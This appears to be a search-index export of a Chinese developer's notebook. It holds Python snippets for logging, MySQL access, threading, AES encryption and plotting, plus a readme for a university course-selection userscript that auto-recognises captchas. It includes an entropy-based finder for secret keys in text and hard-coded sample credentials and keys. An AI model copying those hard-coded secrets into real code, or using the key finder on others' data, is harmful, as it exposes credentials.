\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f\u7684\u597d\u5904\u4e0d\u4ec5\u662f\u663e\u793a\u65f6\u95f4\uff0c\u800c\u4e14\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u5c06\u5f80\u5c4f\u5e55\u8f93\u51fa\u6539\u4e3a\u5199\u6587\u4ef6\uff1b\u66f4\u4f18\u96c5\u7684\u65b9\u5f0f\u662f\u7528logging import time def myprint ( * args , ** kwargs ): args = list ( args ) args [ 0 ] = \"[\" + time . strftime ( \"%Y-%m- %d %H:%M:%S\" ) + \"] \" + str ( args [ 0 ]) print ( * args , ** kwargs ) \u4f7f\u7528\u7684\u65f6\u5019\u5c31\u548cprint\u4e00\u6837\u4f7f\u7528\uff0c\u53ef\u4ee5\u4f20\u5165\u591a\u4e2a\u53c2\u6570 myprint(\"aha myprint\", 666) \u8fde\u63a5mysql\u6279\u91cf\u63d2\u5165\u3001\u67e5\u8be2 \u00b6 config.py: MYSQL_DB = \"web\" MYSQL_USER = \"web\" MYSQL_PASSWORD = \"sEcret_strOng_passw0rd\" MYSQL_HOST = \"localhost\" MYSQL_PORT = 3306 from config import MYSQL_HOST , MYSQL_PORT , MYSQL_USER , MYSQL_PASSWORD , MYSQL_DB import threading , pymysql , warnings , time thread_data = threading . local () def db (): global thread_data conn = pymysql . connect ( user = MYSQL_USER , passwd = MYSQL_PASSWORD , host = MYSQL_HOST , port = MYSQL_PORT , db = MYSQL_DB , charset = 'utf8' , init_command = \"set NAMES utf8mb4\" , use_unicode = True ) thread_data . __dict__ [ \"conn\" ] = conn return conn def runsql ( sql , * args , onerror = 'raise' , returnid = False , allow_retry = True ): global thread_data conn = thread_data . __dict__ . get ( \"conn\" ) if len ( args ) == 1 and isinstance ( args [ 0 ], list ): args = args [ 0 ] if not conn : conn = db () if not conn . open : conn = db () cur = conn . cursor () try : conn . ping () except : print ( \"conn.ping() failed, reconnect\" ) conn = db () try : with warnings . catch_warnings (): warnings . simplefilter ( \"ignore\" ) cur . execute ( sql , args ) except pymysql . err . OperationalError as e : conn . commit () cur . close () if allow_retry and ( \"Lost connection to MySQL\" in str ( e ) or \"MySQL server has gone away\" in str ( e )): conn . close () conn = db () return runsql ( sql , * args , onerror = onerror , returnid = returnid , allow_retry = False ) else : raise except : conn . commit () cur . close () if onerror == \"ignore\" : return False else : raise if returnid : cur . execute ( \"SELECT LAST_INSERT_ID();\" ) result = list ( cur )[ 0 ][ 0 ] else : result = list ( cur ) conn . commit () cur . close () return result def tags_tagname2ids_set ( tagname ): \"\"\" select\u67e5\u8be2\u793a\u4f8b \u8fd4\u56de\u5305\u542b\u6807\u7b7etagname\u7684\u5e16\u5b50id\u96c6\u5408 \"\"\" sql = \"select topicid from tags where tagname= %s \" sqlresult = runsql ( sql , tagname ) return set ([ i [ 0 ] for i in sqlresult ]) def usersettings_write_bool ( userid , username , settingname , settingvalue ): \"\"\" replace\u67e5\u8be2\u793a\u4f8b \u5199\u5165\u7528\u6237\u914d\u7f6e\u4fe1\u606f\u81f3usersetting\u8868 \u8fd4\u56debool \"\"\" sql = \"replace into usersettings values ( %s , %s , %s , %s )\" try : runsql ( sql , userid , username , settingname , settingvalue ) return True except : traceback . print_exc () return False \u5927\u5c0f\u5199\u4e0d\u654f\u611f\u5b57\u5178 \u00b6 from requests.structures import CaseInsensitiveDict mydict = CaseInsensitiveDict ( mydict ) mpms\u591a\u7ebf\u7a0b\u4e0b\u6bcf\u4e2a\u7ebf\u7a0b\u5355\u72ec\u53d8\u91cf \u00b6 \u81ea\u5df1\u5199\u7684\u7c7b\u4e0d\u662f\u7ebf\u7a0b\u5b89\u5168\u7684\uff0c\u6240\u4ee5\u5728\u591a\u7ebf\u7a0b\u4e0b\u8981\u505a\u5230\u6bcf\u4e2a\u7ebf\u7a0b\u81ea\u5df1\u4e00\u4e2a\u53d8\u91cf\u4e92\u4e0d\u5e72\u6270 mpms\u4e0b\u4f7f\u7528EasyLogin\u5b8c\u6574\u793a\u4f8b\u4ee3\u7801\u6a21\u677f\uff0c \u5148\u8981\u4f7f\u7528\u6211fork\u7684\u7248\u672c \u52a0\u4e0a\u4e86len\u652f\u6301\uff1a wget https://d.py3.io/mpms.py from mpms import MPMS from EasyLogin import EasyLogin import threading thread_data = threading . local () import time myprint = lambda s : print ( \"[ {showtime} ] {s} \" . format ( showtime = time . strftime ( \"%Y-%m- %d %H:%M:%S\" ), s = s )) def worker ( id ): global thread_data a = thread_data . __dict__ . get ( \"a\" ) if not a : a = EasyLogin () thread_data . __dict__ [ \"a\" ] = a pass # do the stuff, like a.get return result def handler ( meta , result ): # meta[\"fp\"].write ... pass # do the stuff if __name__ == \"__main__\" : meta = { \"fp\" : open ( \"result.txt\" , \"w\" , encoding = \"utf-8\" )} m = MPMS ( worker , handler , 2 , 2 , meta = meta ) m . start () for i in range ( ... ): m . put ( i ) while len ( m ) > 10 : myprint ( \"Remaning \" + str ( len ( m ))) time . sleep ( 2 ) m . join () myprint ( \"Done!\" ) \u5c06\u503c\u5b58\u5165\u5b57\u5178\u4e2d\u7684\u5217\u8868 dict_add_list \u00b6 \u5224\u65adkey\u662f\u5426\u5b58\u5728 \u5e94\u8be5\u6709\u66f4\u597d\u7684\u65b9\u6cd5\uff1f\u8fd9\u4e2a\u5b9e\u73b0\u8fd8\u662f\u5f88naive\u7684 def dict_add_list ( dictname , key , value ) : if key not in dictname : dictname [ key ] = [ value ] else : dictname [ key ] . append ( value ) # \u5982\u679c\u5b57\u5178\u662f\u5b58\u50a8count\u8ba1\u6570\u7684\u8bdd \u7528\u8fd9\u4e2a def dict_incr ( dictname , key ) : if key not in dictname : dictname [ key ] = 1 else : dictname [ key ] += 1 \u4f7f\u7528AES\u52a0\u5bc6\u5b57\u7b26\u4e32 \u00b6 https://github.com/ricmoo/pyaes \u9996\u5148 pip install pyaes -t . \u6ce8\u610f\u6bcf\u6b21\u52a0\u5bc6\u7684\u65f6\u5019\u90fd\u9700\u8981\u91cd\u65b0\u521d\u59cb\u5316aes \u52a0\u5bc6\uff1a plaintext = \"hello world\" import pyaes , base64 aes = pyaes . AESModeOfOperationCTR ( b \"This_key_for_demo_purposes_only!\" ) encrypted_text = base64 . b64encode ( aes . encrypt ( plaintext . encode ( \"utf-8\" ))) print ( encrypted_text ) # ipkEJevbnsfbEm4= \u89e3\u5bc6\uff1a encrypted_text = \"ipkEJevbnsfbEm4=\" import pyaes , base64 aes = pyaes . AESModeOfOperationCTR ( b \"This_key_for_demo_purposes_only!\" ) plaintext = aes . decrypt ( base64 . b64decode ( encrypted_text )) . decode () print ( plaintext ) # hello world Python\u753b\u56fe \u4e0a\u65b9\u989c\u8272\uff0c\u7136\u540eM*N\u4e2a\u5c0f\u56fe \u00b6 TODO: \u589e\u52a0\u4e00\u5f20\u793a\u610f\u56fe import json import matplotlib.pyplot as plt import seaborn as sns import matplotlib.gridspec as gridspec import gzip import pickle import os import shutil def plotmatrix ( M , N , DATA , labels , colors , xlabel , ylabel , fontsize , sep ): \"\"\" M: how many rows, like 4 N: how many cols, like 5 DATA: [{ \"name\": \"figure title\", \"lines\":[ [[...], [...]], ] }] labels: the label of lines, like [fuzzerA, fuzzerB] colors: color of lines, like [red, blue] xlabel: like \"#Time (days)\" fontsize: 13 sep: (wspace, hspace) like (0.5, 0.5) \"\"\" assert M * N >= len ( DATA ) fig = plt . figure ( figsize = ( M * 5 , N * 1.2 )) outer = gridspec . GridSpec ( 2 , 1 , wspace = 0.2 , hspace = 0.4 , height_ratios = [ 1 , 10 ]) inner = gridspec . GridSpecFromSubplotSpec ( M , N , subplot_spec = outer [ 1 ], wspace = sep [ 0 ], hspace = sep [ 1 ]) index = - 1 for data in DATA : index += 1 ax = plt . Subplot ( fig , inner [ index ]) fig . add_subplot ( ax ) plt . title ( data [ \"name\" ]) for i , line in enumerate ( data [ \"lines\" ]): plt . plot ( * line , label = labels [ i ], color = colors [ i ]) ax = plt . gca () ax . title . set_fontsize ( fontsize ) plt . xlabel ( xlabel , fontsize = fontsize - 2 ) plt . ylabel ( ylabel , fontsize = fontsize - 2 ) ax = plt . Subplot ( fig , outer [ 0 ]) ax . set_ylabel ( '' ) ax . set_xlabel ( '' ) fig . add_subplot ( ax ) ax = sns . boxplot ( x = [ 0 ] * len ( labels ), y = [ 0 ] * len ( labels ), sym = '' , hue = labels , linewidth = 0 , palette = colors , ax = ax , boxprops = { \"linestyle\" : \"None\" }) ax . spines [ 'right' ] . set_visible ( False ) ax . spines [ 'top' ] . set_visible ( False ) ax . spines [ 'left' ] . set_visible ( False ) ax . spines [ 'bottom' ] . set_visible ( False ) plt . xticks ([]) plt . yticks ([]) handles , labels = ax . get_legend_handles_labels () plt . legend ( handles , labels , loc = 'center' , ncol = 8 , fontsize = fontsize - 1 ) plt . show () \u4ece\u4e00\u7cfb\u5217zip\u6587\u4ef6\u4e2d\u63d0\u53d6C\u4ee3\u7801 \u00b6 from zipfile import ZipFile import os for i in os . listdir (): print ( i ) z = ZipFile ( i ) files = [ i . filename for i in z . filelist if i . filename . lower () . endswith ( \".c\" ) or i . filename . lower () . endswith ( \".cpp\" )] files = [ i for i in files if \"StdAfx\" not in i ] print ( files ) contents = b \"\" for f in files : c = z . open ( f ) . read () if c in contents : continue contents += c open ( \"../output/\" + i . split ( \".\" )[ 0 ] + \".asm\" , \"wb\" ) . write ( contents ) \u5728\u4e00\u6279\u6587\u672c\u4e2d\u67e5\u627e\u53ef\u80fd\u7684\u5bc6\u94a5 \u00b6 \u5bc6\u94a5\u5b57\u7b26\u4e32\u4e00\u822c\u4e3a\u968f\u673a\u5b57\u7b26\u4e32\uff0c\u800c\u975e\u82f1\u6587\u5355\u8bcd\uff0c\u6839\u636e\u8fd9\u4e00\u7279\u5f81\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u53bb\u9664\u5e38\u89c1\u82f1\u6587\u5355\u8bcd\u540e\u7684\u4fe1\u606f\u71b5\u8fd9\u4e00\u7279\u5f81\u6765\u627e\u51fa\u53ef\u80fd\u7684\u5bc6\u94a5\u5b57\u7b26\u4e32 import re from password_strength import PasswordStats commonwords = set ( i . strip () for i in open ( \"google-10000-english.txt\" ) . readlines ()) def text_entropy ( text ): for word in re . split ( '[^a-zA-Z]' , text ): if word in commonwords : text = text . replace ( word , \"\" ) if not text : return 0 return PasswordStats ( text ) . strength () \u53c2\u8003\uff1a https://pypi.org/project/password-strength/ https://github.com/first20hours/google-10000-english/","title":"Gist Python\u4e00\u4e9b\u5e38\u7528\u4ee3\u7801\u7247\u6bb5"},{"location":"gist/#gist","text":"","title":"gist \u8bb0\u5f55\u4e00\u4e9b\u4ee3\u7801\u7247\u6bb5"},{"location":"gist/#print","text":"\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f\u7684\u597d\u5904\u4e0d\u4ec5\u662f\u663e\u793a\u65f6\u95f4\uff0c\u800c\u4e14\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u5c06\u5f80\u5c4f\u5e55\u8f93\u51fa\u6539\u4e3a\u5199\u6587\u4ef6\uff1b\u66f4\u4f18\u96c5\u7684\u65b9\u5f0f\u662f\u7528logging import time def myprint ( * args , ** kwargs ): args = list ( args ) args [ 0 ] = \"[\" + time . strftime ( \"%Y-%m- %d %H:%M:%S\" ) + \"] \" + str ( args [ 0 ]) print ( * args , ** kwargs ) \u4f7f\u7528\u7684\u65f6\u5019\u5c31\u548cprint\u4e00\u6837\u4f7f\u7528\uff0c\u53ef\u4ee5\u4f20\u5165\u591a\u4e2a\u53c2\u6570 myprint(\"aha myprint\", 666)","title":"print\u7684\u65f6\u5019\u987a\u5e26\u5e26\u4e0a\u65f6\u95f4"},{"location":"gist/#mysql","text":"config.py: MYSQL_DB = \"web\" MYSQL_USER = \"web\" MYSQL_PASSWORD = \"sEcret_strOng_passw0rd\" MYSQL_HOST = \"localhost\" MYSQL_PORT = 3306 from config import MYSQL_HOST , MYSQL_PORT , MYSQL_USER , MYSQL_PASSWORD , MYSQL_DB import threading , pymysql , warnings , time thread_data = threading . local () def db (): global thread_data conn = pymysql . connect ( user = MYSQL_USER , passwd = MYSQL_PASSWORD , host = MYSQL_HOST , port = MYSQL_PORT , db = MYSQL_DB , charset = 'utf8' , init_command = \"set NAMES utf8mb4\" , use_unicode = True ) thread_data . __dict__ [ \"conn\" ] = conn return conn def runsql ( sql , * args , onerror = 'raise' , returnid = False , allow_retry = True ): global thread_data conn = thread_data . __dict__ . get ( \"conn\" ) if len ( args ) == 1 and isinstance ( args [ 0 ], list ): args = args [ 0 ] if not conn : conn = db () if not conn . open : conn = db () cur = conn . cursor () try : conn . ping () except : print ( \"conn.ping() failed, reconnect\" ) conn = db () try : with warnings . catch_warnings (): warnings . simplefilter ( \"ignore\" ) cur . execute ( sql , args ) except pymysql . err . OperationalError as e : conn . commit () cur . close () if allow_retry and ( \"Lost connection to MySQL\" in str ( e ) or \"MySQL server has gone away\" in str ( e )): conn . close () conn = db () return runsql ( sql , * args , onerror = onerror , returnid = returnid , allow_retry = False ) else : raise except : conn . commit () cur . close () if onerror == \"ignore\" : return False else : raise if returnid : cur . execute ( \"SELECT LAST_INSERT_ID();\" ) result = list ( cur )[ 0 ][ 0 ] else : result = list ( cur ) conn . commit () cur . close () return result def tags_tagname2ids_set ( tagname ): \"\"\" select\u67e5\u8be2\u793a\u4f8b \u8fd4\u56de\u5305\u542b\u6807\u7b7etagname\u7684\u5e16\u5b50id\u96c6\u5408 \"\"\" sql = \"select topicid from tags where tagname= %s \" sqlresult = runsql ( sql , tagname ) return set ([ i [ 0 ] for i in sqlresult ]) def usersettings_write_bool ( userid , username , settingname , settingvalue ): \"\"\" replace\u67e5\u8be2\u793a\u4f8b \u5199\u5165\u7528\u6237\u914d\u7f6e\u4fe1\u606f\u81f3usersetting\u8868 \u8fd4\u56debool \"\"\" sql = \"replace into usersettings values ( %s , %s , %s , %s )\" try : runsql ( sql , userid , username , settingname , settingvalue ) return True except : traceback . print_exc () return False","title":"\u8fde\u63a5mysql\u6279\u91cf\u63d2\u5165\u3001\u67e5\u8be2"},{"location":"gist/#_1","text":"from requests.structures import CaseInsensitiveDict mydict = CaseInsensitiveDict ( mydict )","title":"\u5927\u5c0f\u5199\u4e0d\u654f\u611f\u5b57\u5178"},{"location":"gist/#mpms","text":"\u81ea\u5df1\u5199\u7684\u7c7b\u4e0d\u662f\u7ebf\u7a0b\u5b89\u5168\u7684\uff0c\u6240\u4ee5\u5728\u591a\u7ebf\u7a0b\u4e0b\u8981\u505a\u5230\u6bcf\u4e2a\u7ebf\u7a0b\u81ea\u5df1\u4e00\u4e2a\u53d8\u91cf\u4e92\u4e0d\u5e72\u6270 mpms\u4e0b\u4f7f\u7528EasyLogin\u5b8c\u6574\u793a\u4f8b\u4ee3\u7801\u6a21\u677f\uff0c \u5148\u8981\u4f7f\u7528\u6211fork\u7684\u7248\u672c \u52a0\u4e0a\u4e86len\u652f\u6301\uff1a wget https://d.py3.io/mpms.py from mpms import MPMS from EasyLogin import EasyLogin import threading thread_data = threading . local () import time myprint = lambda s : print ( \"[ {showtime} ] {s} \" . format ( showtime = time . strftime ( \"%Y-%m- %d %H:%M:%S\" ), s = s )) def worker ( id ): global thread_data a = thread_data . __dict__ . get ( \"a\" ) if not a : a = EasyLogin () thread_data . __dict__ [ \"a\" ] = a pass # do the stuff, like a.get return result def handler ( meta , result ): # meta[\"fp\"].write ... pass # do the stuff if __name__ == \"__main__\" : meta = { \"fp\" : open ( \"result.txt\" , \"w\" , encoding = \"utf-8\" )} m = MPMS ( worker , handler , 2 , 2 , meta = meta ) m . start () for i in range ( ... ): m . put ( i ) while len ( m ) > 10 : myprint ( \"Remaning \" + str ( len ( m ))) time . sleep ( 2 ) m . join () myprint ( \"Done!\" )","title":"mpms\u591a\u7ebf\u7a0b\u4e0b\u6bcf\u4e2a\u7ebf\u7a0b\u5355\u72ec\u53d8\u91cf"},{"location":"gist/#dict_add_list","text":"\u5224\u65adkey\u662f\u5426\u5b58\u5728 \u5e94\u8be5\u6709\u66f4\u597d\u7684\u65b9\u6cd5\uff1f\u8fd9\u4e2a\u5b9e\u73b0\u8fd8\u662f\u5f88naive\u7684 def dict_add_list ( dictname , key , value ) : if key not in dictname : dictname [ key ] = [ value ] else : dictname [ key ] . append ( value ) # \u5982\u679c\u5b57\u5178\u662f\u5b58\u50a8count\u8ba1\u6570\u7684\u8bdd \u7528\u8fd9\u4e2a def dict_incr ( dictname , key ) : if key not in dictname : dictname [ key ] = 1 else : dictname [ key ] += 1","title":"\u5c06\u503c\u5b58\u5165\u5b57\u5178\u4e2d\u7684\u5217\u8868 dict_add_list"},{"location":"gist/#aes","text":"https://github.com/ricmoo/pyaes \u9996\u5148 pip install pyaes -t . \u6ce8\u610f\u6bcf\u6b21\u52a0\u5bc6\u7684\u65f6\u5019\u90fd\u9700\u8981\u91cd\u65b0\u521d\u59cb\u5316aes \u52a0\u5bc6\uff1a plaintext = \"hello world\" import pyaes , base64 aes = pyaes . AESModeOfOperationCTR ( b \"This_key_for_demo_purposes_only!\" ) encrypted_text = base64 . b64encode ( aes . encrypt ( plaintext . encode ( \"utf-8\" ))) print ( encrypted_text ) # ipkEJevbnsfbEm4= \u89e3\u5bc6\uff1a encrypted_text = \"ipkEJevbnsfbEm4=\" import pyaes , base64 aes = pyaes . AESModeOfOperationCTR ( b \"This_key_for_demo_purposes_only!\" ) plaintext = aes . decrypt ( base64 . b64decode ( encrypted_text )) . decode () print ( plaintext ) # hello world","title":"\u4f7f\u7528AES\u52a0\u5bc6\u5b57\u7b26\u4e32"},{"location":"gist/#python-mn","text":"TODO: \u589e\u52a0\u4e00\u5f20\u793a\u610f\u56fe import json import matplotlib.pyplot as plt import seaborn as sns import matplotlib.gridspec as gridspec import gzip import pickle import os import shutil def plotmatrix ( M , N , DATA , labels , colors , xlabel , ylabel , fontsize , sep ): \"\"\" M: how many rows, like 4 N: how many cols, like 5 DATA: [{ \"name\": \"figure title\", \"lines\":[ [[...], [...]], ] }] labels: the label of lines, like [fuzzerA, fuzzerB] colors: color of lines, like [red, blue] xlabel: like \"#Time (days)\" fontsize: 13 sep: (wspace, hspace) like (0.5, 0.5) \"\"\" assert M * N >= len ( DATA ) fig = plt . figure ( figsize = ( M * 5 , N * 1.2 )) outer = gridspec . GridSpec ( 2 , 1 , wspace = 0.2 , hspace = 0.4 , height_ratios = [ 1 , 10 ]) inner = gridspec . GridSpecFromSubplotSpec ( M , N , subplot_spec = outer [ 1 ], wspace = sep [ 0 ], hspace = sep [ 1 ]) index = - 1 for data in DATA : index += 1 ax = plt . Subplot ( fig , inner [ index ]) fig . add_subplot ( ax ) plt . title ( data [ \"name\" ]) for i , line in enumerate ( data [ \"lines\" ]): plt . plot ( * line , label = labels [ i ], color = colors [ i ]) ax = plt . gca () ax . title . set_fontsize ( fontsize ) plt . xlabel ( xlabel , fontsize = fontsize - 2 ) plt . ylabel ( ylabel , fontsize = fontsize - 2 ) ax = plt . Subplot ( fig , outer [ 0 ]) ax . set_ylabel ( '' ) ax . set_xlabel ( '' ) fig . add_subplot ( ax ) ax = sns . boxplot ( x = [ 0 ] * len ( labels ), y = [ 0 ] * len ( labels ), sym = '' , hue = labels , linewidth = 0 , palette = colors , ax = ax , boxprops = { \"linestyle\" : \"None\" }) ax . spines [ 'right' ] . set_visible ( False ) ax . spines [ 'top' ] . set_visible ( False ) ax . spines [ 'left' ] . set_visible ( False ) ax . spines [ 'bottom' ] . set_visible ( False ) plt . xticks ([]) plt . yticks ([]) handles , labels = ax . get_legend_handles_labels () plt . legend ( handles , labels , loc = 'center' , ncol = 8 , fontsize = fontsize - 1 ) plt . show ()","title":"Python\u753b\u56fe \u4e0a\u65b9\u989c\u8272\uff0c\u7136\u540eM*N\u4e2a\u5c0f\u56fe"},{"location":"gist/#zipc","text":"from zipfile import ZipFile import os for i in os . listdir (): print ( i ) z = ZipFile ( i ) files = [ i . filename for i in z . filelist if i . filename . lower () . endswith ( \".c\" ) or i . filename . lower () . endswith ( \".cpp\" )] files = [ i for i in files if \"StdAfx\" not in i ] print ( files ) contents = b \"\" for f in files : c = z . open ( f ) . read () if c in contents : continue contents += c open ( \"../output/\" + i . split ( \".\" )[ 0 ] + \".asm\" , \"wb\" ) . write ( contents )","title":"\u4ece\u4e00\u7cfb\u5217zip\u6587\u4ef6\u4e2d\u63d0\u53d6C\u4ee3\u7801"},{"location":"gist/#_2","text":"\u5bc6\u94a5\u5b57\u7b26\u4e32\u4e00\u822c\u4e3a\u968f\u673a\u5b57\u7b26\u4e32\uff0c\u800c\u975e\u82f1\u6587\u5355\u8bcd\uff0c\u6839\u636e\u8fd9\u4e00\u7279\u5f81\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u53bb\u9664\u5e38\u89c1\u82f1\u6587\u5355\u8bcd\u540e\u7684\u4fe1\u606f\u71b5\u8fd9\u4e00\u7279\u5f81\u6765\u627e\u51fa\u53ef\u80fd\u7684\u5bc6\u94a5\u5b57\u7b26\u4e32 import re from password_strength import PasswordStats commonwords = set ( i . strip () for i in open ( \"google-10000-english.txt\" ) . readlines ()) def text_entropy ( text ): for word in re . split ( '[^a-zA-Z]' , text ): if word in commonwords : text = text . replace ( word , \"\" ) if not text : return 0 return PasswordStats ( text ) . strength () \u53c2\u8003\uff1a https://pypi.org/project/password-strength/ https://github.com/first20hours/google-10000-english/","title":"\u5728\u4e00\u6279\u6587\u672c\u4e2d\u67e5\u627e\u53ef\u80fd\u7684\u5bc6\u94a5"},{"location":"zjugrshelper/","text":"ZJU grs helper \u6d59\u5927\u7814\u7a76\u751f\u9009\u8bfe\u52a9\u624b \u00b6 \u7248\u672c: v0.5.0 \u76ee\u524d\u7684\u529f\u80fd\u5217\u8868\uff1a \u201c\u5168\u6821\u5f00\u8bfe\u60c5\u51b5\u67e5\u8be2\u201d\u9875\u9762 \u76f4\u63a5\u8fdb\u5165\u9009\u8bfe\u2014\u2014\u4e0d\u518d\u8ff7\u832b\u4e8e\u6ca1\u5f00\u7684\u8bfe\u7a0b \u6574\u5408\u67e5\u8001\u5e08\u5206\u6570\u4e0e\u8bc4\u8bba\u663e\u793a\uff0c\u9009\u8bfe\u754c\u9762\u76f4\u63a5\u770b\u8bc4\u5206\u2014\u2014\u9009\u4e2a\u597d\u70b9\u7684\u8001\u5e08\u5457 \u53ea\u770b\u7279\u5b9a\u6821\u533a\u7684\u8bfe\u7a0b\u73ed\u7ea7\u2014\u2014\u4e0d\u60f3\u6821\u533a\u95f4\u5954\u6ce2\uff1f\u51cf\u8f7b\u4eba\u5de5\u7b5b\u9009\u8d1f\u62c5 \u7981\u7528\u9876\u90e8\u9f20\u6807\u5207\u6362\u4e8b\u4ef6\uff0c\u4e0d\u7528\u518d\u5c0f\u5fc3\u7ffc\u7ffc\u5730\u79fb\u52a8\u9f20\u6807 \u767b\u5f55\u9875\u9762\u81ea\u52a8\u8bc6\u522b\u9a8c\u8bc1\u7801 \u5982\u679c\u8bc6\u522b\u6709\u8bef\u53ef\u4ee5\u70b9\u51fb\u9a8c\u8bc1\u7801\u56fe\u7247\u518d\u6b21\u8bc6\u522b \u5b89\u88c5\u65b9\u6cd5 \u00b6 \u7528 Chrome \u7684\u4eba\u90fd\u9700\u8981\u77e5\u9053\u7684\u300c\u795e\u5668\u300d\u6269\u5c55\uff1aTampermonkey\u4f7f\u7528\u8be6\u89e3 \u7136\u540e\u6233\u8fd9\u4e2a\u94fe\u63a5 \u786e\u8ba4\u5b89\u88c5\uff1a https://github.com/zjuchenyuan/notebook/raw/master/code/zju_grs_helper.user.js \u7136\u540e\u5c31\u80fd\u8fdb\u5165\u9009\u8bfe\u54af\uff1a\u5982\u5168\u6821\u5f00\u8bfe\u60c5\u51b5\u67e5\u8be2 http://grs.zju.edu.cn/py/page/student/lnsjCxdc.htm \u5728\u4f7f\u7528\u8fc7\u7a0b\u4e2d \u9047\u5230\u4ee5\u4e0b\u5f39\u6846\u8bf7\u52a1\u5fc5\u9009\u62e9 \u603b\u662f\u5141\u8bb8\u57df\u540d \u8c01\u80fd\u6559\u6559\u6211\u4e3a\u5565\u7528 @connect chalaoshi.cn \u5c31\u662f\u4e0d\u884c\u554a \u914d\u7f6e\u9879 \u00b6 \u53ea\u663e\u793a\u7279\u5b9a\u6821\u533a\u8bfe\u7a0b\uff1a\u4fee\u6539\u4ee3\u7801\u4e2d\u7684 CONFIG_XQ \u53d8\u91cf \u4f7f\u7528\u65b9\u6cd5 \u00b6 \u767b\u5f55\u9009\u8bfe\u7f51\u7ad9 http://grs.zju.edu.cn/allogene/page/home.htm \u6253\u5f00\u201c\u5168\u6821\u5f00\u8bfe\u60c5\u51b5\u67e5\u8be2\u201d\u9875\u9762\uff08 \u57f9\u517b \u7684\u6700\u53f3\u4fa7\u9879\uff09 http://grs.zju.edu.cn/py/page/student/lnsjCxdc.htm \u9009\u62e9 \u5f00\u8bfe\u5b66\u9662 \uff0c\u4f8b\u5982 \u7ecf\u6d4e\u5b66\u9662 \uff0c\u67e5\u8be2 \u53ef\u89c1 \u5f00\u8bfe\u53f7 \u73b0\u5728\u53ef\u4ee5\u70b9\u51fb\uff0c\u627e\u5230\u4f60\u60f3\u9009\u7684\u8bfe\u7a0b\uff0c\u5373\u53ef\u8fdb\u5165\u9009\u8bfe \u5728\u9009\u8bfe\u5217\u8868\u4e2d\u663e\u793a \u67e5\u8001\u5e08\u7f51\u7ad9 \u4e0a\u7684\u8bc4\u5206\u6570\u636e\uff08\u5982\u679c\u6709\u591a\u6761\u6570\u636e\u5219\u90fd\u663e\u793a\uff09 \u53ef\u4ee5\u70b9\u5f00\u8bc4\u5206\u6570\u636e\u67e5\u770b\u8bc4\u8bba \u867d\u7136\u73b0\u5728\u6837\u5f0femmmm \u6b22\u8fce\u53cd\u9988\u4e0e\u8d21\u732e \u00b6 \u4f7f\u7528\u9047\u5230bug\uff1f\u9700\u8981\u66f4\u591a\u529f\u80fd\uff1f\u6765\u63d0\u4e2aissue\u5427\uff1a https://github.com/zjuchenyuan/notebook/issues \u6b22\u8fce\u7ed9\u4e2astar\u54af\uff1a https://github.com/zjuchenyuan/notebook","title":"ZJU grs helper"},{"location":"zjugrshelper/#zju-grs-helper","text":"\u7248\u672c: v0.5.0 \u76ee\u524d\u7684\u529f\u80fd\u5217\u8868\uff1a \u201c\u5168\u6821\u5f00\u8bfe\u60c5\u51b5\u67e5\u8be2\u201d\u9875\u9762 \u76f4\u63a5\u8fdb\u5165\u9009\u8bfe\u2014\u2014\u4e0d\u518d\u8ff7\u832b\u4e8e\u6ca1\u5f00\u7684\u8bfe\u7a0b \u6574\u5408\u67e5\u8001\u5e08\u5206\u6570\u4e0e\u8bc4\u8bba\u663e\u793a\uff0c\u9009\u8bfe\u754c\u9762\u76f4\u63a5\u770b\u8bc4\u5206\u2014\u2014\u9009\u4e2a\u597d\u70b9\u7684\u8001\u5e08\u5457 \u53ea\u770b\u7279\u5b9a\u6821\u533a\u7684\u8bfe\u7a0b\u73ed\u7ea7\u2014\u2014\u4e0d\u60f3\u6821\u533a\u95f4\u5954\u6ce2\uff1f\u51cf\u8f7b\u4eba\u5de5\u7b5b\u9009\u8d1f\u62c5 \u7981\u7528\u9876\u90e8\u9f20\u6807\u5207\u6362\u4e8b\u4ef6\uff0c\u4e0d\u7528\u518d\u5c0f\u5fc3\u7ffc\u7ffc\u5730\u79fb\u52a8\u9f20\u6807 \u767b\u5f55\u9875\u9762\u81ea\u52a8\u8bc6\u522b\u9a8c\u8bc1\u7801 \u5982\u679c\u8bc6\u522b\u6709\u8bef\u53ef\u4ee5\u70b9\u51fb\u9a8c\u8bc1\u7801\u56fe\u7247\u518d\u6b21\u8bc6\u522b","title":"ZJU grs helper \u6d59\u5927\u7814\u7a76\u751f\u9009\u8bfe\u52a9\u624b"},{"location":"zjugrshelper/#_1","text":"\u7528 Chrome \u7684\u4eba\u90fd\u9700\u8981\u77e5\u9053\u7684\u300c\u795e\u5668\u300d\u6269\u5c55\uff1aTampermonkey\u4f7f\u7528\u8be6\u89e3 \u7136\u540e\u6233\u8fd9\u4e2a\u94fe\u63a5 \u786e\u8ba4\u5b89\u88c5\uff1a https://github.com/zjuchenyuan/notebook/raw/master/code/zju_grs_helper.user.js \u7136\u540e\u5c31\u80fd\u8fdb\u5165\u9009\u8bfe\u54af\uff1a\u5982\u5168\u6821\u5f00\u8bfe\u60c5\u51b5\u67e5\u8be2 http://grs.zju.edu.cn/py/page/student/lnsjCxdc.htm \u5728\u4f7f\u7528\u8fc7\u7a0b\u4e2d \u9047\u5230\u4ee5\u4e0b\u5f39\u6846\u8bf7\u52a1\u5fc5\u9009\u62e9 \u603b\u662f\u5141\u8bb8\u57df\u540d \u8c01\u80fd\u6559\u6559\u6211\u4e3a\u5565\u7528 @connect chalaoshi.cn \u5c31\u662f\u4e0d\u884c\u554a","title":"\u5b89\u88c5\u65b9\u6cd5"},{"location":"zjugrshelper/#_2","text":"\u53ea\u663e\u793a\u7279\u5b9a\u6821\u533a\u8bfe\u7a0b\uff1a\u4fee\u6539\u4ee3\u7801\u4e2d\u7684 CONFIG_XQ \u53d8\u91cf","title":"\u914d\u7f6e\u9879"},{"location":"zjugrshelper/#_3","text":"\u767b\u5f55\u9009\u8bfe\u7f51\u7ad9 http://grs.zju.edu.cn/allogene/page/home.htm \u6253\u5f00\u201c\u5168\u6821\u5f00\u8bfe\u60c5\u51b5\u67e5\u8be2\u201d\u9875\u9762\uff08 \u57f9\u517b \u7684\u6700\u53f3\u4fa7\u9879\uff09 http://grs.zju.edu.cn/py/page/student/lnsjCxdc.htm \u9009\u62e9 